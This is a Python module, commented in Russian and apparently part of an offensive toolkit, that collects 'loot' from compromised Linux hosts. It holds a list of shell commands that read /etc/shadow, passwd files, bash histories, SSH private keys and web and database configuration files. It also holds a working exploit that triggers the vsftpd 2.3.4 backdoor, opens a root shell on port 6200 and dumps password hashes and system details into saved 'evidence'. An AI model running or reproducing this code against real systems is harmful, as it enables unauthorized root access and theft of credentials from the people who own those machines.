# Looter — сбор артефактов и Evidence

import os
import subprocess
import sys
from datetime import datetime

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)


LOOT_COMMANDS = [
    ("shadow", "cat /etc/shadow 2>/dev/null"),
    ("passwd", "cat /etc/passwd 2>/dev/null"),
    ("hosts", "cat /etc/hosts 2>/dev/null"),
    ("bash_history", "cat /root/.bash_history 2>/dev/null; cat /home/*/.bash_history 2>/dev/null"),
    ("ssh_keys", "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'authorized_keys' 2>/dev/null | head -20"),
    ("mysql_conf", "cat /etc/mysql/my.cnf 2>/dev/null; cat /etc/my.cnf 2>/dev/null"),
    ("web_configs", "find /var/www -name 'config*' -o -name 'wp-config.php' -o -name '.env' 2>/dev/null | head -20"),
]


def _run_local(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + (("\n[stderr] " + r.stderr) if r.stderr else "")
    except Exception as e:
        return f"[ошибка: {e}]"


def collect_loot(target, output_dir=None, ssh_creds=None):
    if output_dir is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = os.path.join(_ROOT, "loot", f"{target.replace('.', '_')}_{ts}")
    os.makedirs(output_dir, exist_ok=True)
    print(f"[*] Loot dir: {output_dir}")

    summary = {}
    for label, cmd in LOOT_COMMANDS:
        print(f"[*] {label}...")
        out = _run_local(cmd)
        path = os.path.join(output_dir, f"{label}.txt")
        with open(path, "w") as f:
            f.write(out)
        summary[label] = {"path": path, "size": len(out)}

    return {"target": target, "output_dir": output_dir, "summary": summary}


# ============================================================
# LOOT + EVIDENCE через vsftpd backdoor
# ============================================================

def loot_via_backdoor(host, ftp_port=21, backdoor_port=6200, output_dir=None):
    """
    Триггерит vsftpd backdoor → получает root shell → собирает:
      - Evidence (id, uname, hostname, whoami, pwd, date)
      - Loot (shadow, passwd, hosts)
    Возвращает dict с evidence.
    """
    import socket
    import time

    if output_dir is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = os.path.join(_ROOT, "loot", f"{host.replace('.', '_')}_{ts}")
    os.makedirs(output_dir, exist_ok=True)

    log = []

    # 1. Триггер backdoor
    log.append("[*] Триггер vsftpd backdoor...")
    try:
        s = socket.socket()
        s.settimeout(10)
        s.connect((host, ftp_port))
        s.recv(1024)
        s.sendall(b"USER backdoor:)\r\n")
        time.sleep(0.5)
        s.recv(1024)
        s.sendall(b"PASS x\r\n")
        time.sleep(0.3)
        s.close()
    except Exception as e:
        return {"success": False, "log": f"триггер не сработал: {e}"}

    # 2. Коннект к 6200
    time.sleep(0.3)
    shell = None
    for attempt in range(3):
        try:
            shell = socket.socket()
            shell.settimeout(10)
            shell.connect((host, backdoor_port))
            log.append(f"[+] Backdoor shell на {host}:{backdoor_port}")
            break
        except Exception as e:
            log.append(f"[!] попытка {attempt+1}: {e}")
            time.sleep(0.5)

    if shell is None:
        return {"success": False, "log": "\n".join(log)}

    # 3. МЕГА-команда: evidence + loot + разделители
    big_cmd = (
        "echo '==CMD1_ID==' ; id ; "
        "echo '==CMD2_UNAME==' ; uname -a ; "
        "echo '==CMD3_HOSTNAME==' ; hostname ; "
        "echo '==CMD4_WHOAMI==' ; whoami ; "
        "echo '==CMD5_PWD==' ; pwd ; "
        "echo '==CMD6_DATE==' ; date ; "
        "echo '==CMD7_SHADOW_HEAD==' ; head -10 /etc/shadow 2>/dev/null ; "
        "echo '==CMD8_SHADOW_FULL==' ; cat /etc/shadow 2>/dev/null ; "
        "echo '==CMD9_PASSWD==' ; cat /etc/passwd 2>/dev/null ; "
        "echo '==CMD10_HOSTS==' ; cat /etc/hosts 2>/dev/null ; "
        "echo '==CMD11_END=='"
    )

    try:
        shell.sendall((big_cmd + "\n").encode())
        time.sleep(3.0)

        chunks = []
        shell.settimeout(3)
        try:
            while True:
                data = shell.recv(8192)
                if not data:
                    break
                chunks.append(data)
        except socket.timeout:
            pass

        raw = b"".join(chunks).decode(errors="ignore")
        shell.close()
    except Exception as e:
        return {"success": False, "log": f"ошибка чтения: {e}"}

    log.append(f"[+] Получено {len(raw)} байт")

    # 4. Парсинг секций
    def grab(start_marker, end_marker):
        try:
            s_idx = raw.index(start_marker) + len(start_marker)
            # до следующего ==CMD или end_marker
            e_idx = raw.find(end_marker, s_idx)
            if e_idx == -1:
                e_idx = len(raw)
            return raw[s_idx:e_idx].strip()
        except ValueError:
            return ""

    markers = [
        ("==CMD1_ID==", "==CMD2_UNAME==", "id", "id"),
        ("==CMD2_UNAME==", "==CMD3_HOSTNAME==", "uname -a", "uname"),
        ("==CMD3_HOSTNAME==", "==CMD4_WHOAMI==", "hostname", "hostname"),
        ("==CMD4_WHOAMI==", "==CMD5_PWD==", "whoami", "whoami"),
        ("==CMD5_PWD==", "==CMD6_DATE==", "pwd", "pwd"),
        ("==CMD6_DATE==", "==CMD7_SHADOW_HEAD==", "date", "date"),
        ("==CMD7_SHADOW_HEAD==", "==CMD8_SHADOW_FULL==", "head -10 /etc/shadow", "shadow_head"),
        ("==CMD8_SHADOW_FULL==", "==CMD9_PASSWD==", "cat /etc/shadow", "shadow"),
        ("==CMD9_PASSWD==", "==CMD10_HOSTS==", "cat /etc/passwd", "passwd"),
        ("==CMD10_HOSTS==", "==CMD11_END==", "cat /etc/hosts", "hosts"),
    ]

    evidence = {
        "target": host,
        "shell": f"{host}:{backdoor_port}",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "commands": [],
    }
    files = {}

    for start_m, end_m, cmd_label, key in markers:
        out = grab(start_m, end_m)
        if out:
            files[f"{key}.txt"] = out
            evidence["commands"].append((key, cmd_label, out))

    # Основные доказательства
    evidence["shadow_head"] = files.get("shadow_head.txt", "")

    # 5. Сохраняем файлы
    saved = {}
    for name, content in files.items():
        path = os.path.join(output_dir, name)
        with open(path, "w") as f:
            f.write(content)
        saved[name] = {"path": path, "size": len(content)}
        log.append(f"    {name}: {len(content)} байт")

    # raw
    raw_path = os.path.join(output_dir, "raw_output.txt")
    with open(raw_path, "w") as f:
        f.write(raw)

    return {
        "success": True,
        "log": "\n".join(log),
        "output_dir": output_dir,
        "files": saved,
        "shadow_path": saved.get("shadow.txt", {}).get("path"),
        "id_out": files.get("id.txt", ""),
        "evidence": evidence,
    }


if __name__ == "__main__":
    result = collect_loot("127.0.0.1", output_dir="/tmp/aegis_loot_test")
    print("\n=== ИТОГ ===")
    for k, v in result["summary"].items():
        print(f"  {k}: {v['size']} байт")
